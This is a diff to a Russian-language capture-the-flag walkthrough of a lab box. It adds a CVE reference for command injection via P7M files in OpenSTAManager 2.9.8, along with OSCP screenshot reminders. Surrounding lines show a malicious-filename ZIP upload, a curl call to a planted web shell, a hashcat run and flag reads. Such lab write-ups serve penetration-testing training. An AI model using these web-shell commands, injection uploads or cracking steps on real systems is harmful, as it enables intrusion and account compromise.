@@ -127,7 +127,9 @@ Roundcube: `http://mail001.enigma.htb`, вход `sarah:<PASSWORD>`. В почт
 http://support_001.enigma.htb/info.php → Version: 2.9.8
 ```
 
-Уязвима к **CVE-2025-69212** - OS Command Injection через P7M-файлы.
+**CVE-2025-69212** (NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-69212)
+
+OpenSTAManager 2.9.8 - OS Command Injection via P7M files (decodeP7M -> exec without escaping).
 
 Собираем ZIP с вредоносным именем файла, загружаем через Sales → Sales Invoices → Importazione FE.
 
@@ -137,6 +139,9 @@ http://support_001.enigma.htb/info.php → Version: 2.9.8
 curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
 # uid=33(www-data)
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 Reverse shell:
 
@@ -173,6 +178,9 @@ hashcat -m 3200 haris-hash /usr/share/wordlists/rockyou.txt --force
 su haris
 cat ~/user.txt
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
@@ -228,6 +236,9 @@ whoami
 cat /root/root.txt
 # <ROOT_FLAG>
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
